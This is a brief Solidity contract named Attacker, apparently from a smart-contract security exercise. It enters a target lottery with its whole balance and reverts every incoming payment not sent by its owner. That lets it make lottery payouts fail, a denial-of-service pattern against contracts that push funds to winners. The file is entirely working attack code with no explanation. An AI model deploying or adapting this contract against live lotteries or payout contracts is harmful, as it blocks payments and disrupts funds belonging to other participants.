pragma solidity ^0.8.13;

interface ILottery {
    function enter_lottery() external payable;
}

contract Attacker {
    fallback() external payable {
        if (owner != msg.sender) {
            revert();
        }
    }

    address owner;
    address lotteryAddress;

    constructor(address _lottery) {
        owner = msg.sender;
        lotteryAddress = _lottery;
    }

    function Attack() public payable {
        ILottery(lotteryAddress).enter_lottery{value: address(this).balance}();
    }
}